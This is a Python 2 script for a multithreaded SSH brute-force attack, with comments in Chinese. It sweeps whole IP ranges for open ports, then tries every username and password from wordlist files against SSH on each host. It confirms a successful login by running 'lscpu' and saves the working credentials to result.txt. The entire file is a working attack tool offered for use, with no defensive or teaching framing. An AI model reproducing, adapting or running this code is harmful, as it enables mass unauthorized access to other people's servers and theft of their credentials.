#!/usr/bin/env python
# coding:utf-8


import sys
import os
import socket
import struct
import getopt
import Queue
import threading
import time
import urllib2
import ssl
import base64
import paramiko

gQueue = Queue.Queue()
gLock = threading.Lock()
#
gIpList = []
gPortList = []
gThreadAmount = 100
gTimeout = 10
gUserList = []
gPassList = ['']
#
gSCAN = 'scan-port'
gCHECK = 'check-app'
gCRACKSTART = 'crack-pass-start'
gCRACKOK = 'crack-pass-ok'

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context


def exit():
    sys.exit(0)


def ipToNum(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]


def numToIp(num):
    return socket.inet_ntoa(struct.pack('!L', num))


def getIpList(ip):
    global gIpList
    errMsg = '-h:ip format is wrong'
    gIpList = []
    if '.txt' in ip:  # ip文件 ip.txt
        try:
            ipFile = open(ip, 'r')
            for ipf in ipFile:
                gIpList.append(ipf.strip())
            ipFile.close()
        except Exception, e:
            print e
    elif '-' in ip:  # ip段 192.168.1.1-192.168.10.200
        ipRange = ip.split('-')
        ipStart = long(ipToNum(ipRange[0]))
        ipEnd = long(ipToNum(ipRange[1]))
        ipCount = ipEnd - ipStart
        if ipCount >= 0 and ipCount <= 65536:
            for ipNum in range(ipStart, ipEnd + 1):
                gIpList.append(numToIp(ipNum))
        else:
            print errMsg
            exit()
    else:  # ip 192.168  192.168.1  192.168.1.1
        ipSplit = ip.split('.')
        section = len(ipSplit)
        if section == 2:
            for c in range(1, 255):
                for d in range(1, 255):
                    ip = '%s.%s.%d.%d' % (ipSplit[0], ipSplit[1], c, d)
                    gIpList.append(ip)
        elif section == 3:
            for d in range(1, 255):
                ip = '%s.%s.%s.%d' % (ipSplit[0], ipSplit[1], ipSplit[2], d)
                gIpList.append(ip)
        elif section == 4:
            gIpList.append(ip)
        else:
            print errMsg
            exit()
    return gIpList


def putInQueue(taskType, ipList, portList):
    global gQueue
    for ip in ipList:
        for port in portList:
            target = ':'.join([taskType, ip, port])
            gQueue.put(target)


class TaskThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        global gQueue
        global gSCAN
        global gCHECK
        global gCRACKSTART
        while True:
            try:
                if not gQueue.empty():
                    task = gQueue.get()
                else:
                    break
            except:
                break
            try:
                taskType, taskHost, taskPort = task.split(':')

                if taskType == gSCAN:  # 扫描开放端口
                    portFlag = scanPort(taskType, taskHost, taskPort)
                    if portFlag == True:
                        gQueue.put(":".join([gCRACKSTART, taskHost, taskPort]))


                elif taskType == gCRACKSTART:  # 破解密码
                    outputLog(gCRACKSTART, taskHost, taskPort)
                    crackPassword(taskHost, taskPort)
            except:
                continue


def scanPort(taskType, host, port):  # 扫描开放端口
    global gTimeout
    try:
        socket.setdefaulttimeout(gTimeout / 2)
        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect((str(host), int(port)))
        outputLog(taskType, host, port)
        mysock.close()
        return True
    except:
        return False


def checkApp(scanType, host, port):  # 识别应用类型
    global gTimeout
    mark_info = ['tomcat', 'is_test', 'Apache Tomcat']
    try:
        re_html = urllib2.urlopen("http://%s:%d/%s" % (host, int(port), mark_info[1]), timeout=gTimeout).read()
    except urllib2.HTTPError, e:
        re_html = e.read()
    except Exception, e:
        return False
    if mark_info[2].lower() in re_html.lower():
        outputLog(scanType, host, port, mark_info[0])
        return True
    else:
        return False


def crackPassword(host, port):
    global gTimeout
    global gCRACKOK
    global gUserList
    global gPassList
    url = "http://%s:%d" % (host, int(port))
    user_list = gUserList
    pass_list = gPassList
    #pass_list = ['root','123456','root123']
    out = ''
    #flag = 0
    for user in user_list:
        for pwd in pass_list:

            ssh = paramiko.SSHClient()

            policy = paramiko.AutoAddPolicy()

            ssh.set_missing_host_key_policy(policy)
            try:
                ssh.connect(
                    hostname=host,
                    port= 22,
                    username= user,
                    password= pwd,
                    timeout= 20,

                )
                #flag = 1
                stdin, stdout, stderr = ssh.exec_command('lscpu', timeout=20)
                tout = 20
                endtime = time.time() + tout
                while not stdout.channel.eof_received:
                    if time.time() > endtime:
                        stdout.channel.close()
                        break

                while (len(stdout.channel.in_buffer)==0):
                    if time.time() > endtime:
                        stdout.channel.close()
                        break

                out = stdout.readline()
                print out
            except:
                pass
            finally:
                ssh.close()

            if 'Architecture' in out:
                info = '%s,%s,%s' % (host, user, pwd)
                outputLog(gCRACKOK, host, port, info)
                info = 'YES|' + info
                return info

            # if 'Architecture' in out:
            #     print '666'
            #     info = '%s  is %s:%s' % (host, user, pwd)
            #     outputLog(gCRACKOK, host, port, info)
            #     info = 'YES|' + info
            #     return info
    return 'NO'


def outputLog(scanType, host, port, msg=''):
    global gLock
    global gSCAN
    global gCHECK
    global gCRACKSTART
    global gCRACKOK
    gLock.acquire()
    try:
        timeStr = time.strftime('%X', time.localtime(time.time()))
        if scanType == gSCAN:
            print u'[%s]: %s open' % (timeStr, host)
        elif scanType == gCHECK:
            print '[%s]: http://%s:%d is %s' % (timeStr, host, int(port), msg)
        elif scanType == gCRACKSTART:
            print '[%s]: start http://%s' % (timeStr, host)
        elif scanType == gCRACKOK:
            if msg:
                print '[%s]: %s' % (timeStr, msg)
                file = open('result.txt', 'a')
                file.write('%s\r\n' % msg)
                file.close()
        elif scanType == 'test':  # 调试使用
            print 'test:%s:%d' % (host, port)
    finally:
        gLock.release()


def threadJoin(m_count):
    global gQueue
    tmp_count = 0
    i = 0
    while True:
        time.sleep(1)
        ac_count = threading.activeCount()
        if ac_count < m_count and ac_count == tmp_count:  # 防止最后出现僵尸线程,做完事不释放.用变量i控制
            i += 1
        else:
            i = 0
        tmp_count = ac_count
        if (gQueue.empty() and threading.activeCount() <= 1) or i > 8:
            print '----scan over!----'
            break


def getPortList(port):
    global gPortList
    gPortList = []
    filename = 'd.txt'
    if len(port) == 0 or '.txt' in port:
        if '.txt' in port: filename = port
        try:
            file = open(filename, 'r')
            for p in file:
                gPortList.append(p.strip())
            file.close()
        except Exception, e:
            print e
    else:
        gPortList = port.split(',')
    return gPortList


def getUserAndPass():
    global gUserList
    global gPassList
    gUserList = []
    ufile = open('y.txt', 'r')
    for user in ufile:
        gUserList.append(user.strip())
    ufile.close()
    gPassList = []
    pfile = open('m.txt', 'r')
    for p in pfile:
        gPassList.append(p.strip())
    pfile.close()


def main():
    global gIpList
    global gPort
    global gThreadAmount
    global gTimeout
    global gSCAN

    start_time = time.time()
    errorMsg = 'An error has occurred. Usage: python ' + os.path.basename(
        __file__) + ' -h 192.168.1.1 [-p 7001,8080] [-m 50] [-t 10]'
    if (len(sys.argv) < 2):
        print errorMsg
        exit()
    try:
        ip = ''
        port = ''
        options, args = getopt.getopt(sys.argv[1:], 'h:p:m:t:')
        for opt, arg in options:
            if opt == '-h':
                ip = arg
            elif opt == '-p':
                port = arg
            elif opt == '-m':
                gThreadAmount = int(arg)
            elif opt == '-t':
                gTimeout = int(arg)
        if len(ip) > 0:
            ipList = getIpList(ip)  # 获取ip列表
        else:
            print '-h is null. Please input ip.'
        if len(ipList) > 0:
            portList = getPortList(port)  # 获取端口列表
            getUserAndPass()  # 获取用户名密码列表
            putInQueue(gSCAN, ipList, portList)  # ip及端口保存进队列
            for t in range(gThreadAmount):
                t = TaskThread()
                t.setDaemon(True)
                t.start()
            threadJoin(gThreadAmount)
        else:
            print 'IP list is null. Please input ip.'
    except Exception, e:
        print errorMsg
        print 'Detailed Errors:' + e.message
    end_time = time.time()
    cost_time = end_time - start_time
    print '%s cost_time is %s' % (ip, cost_time)

if __name__ == '__main__':
    main()
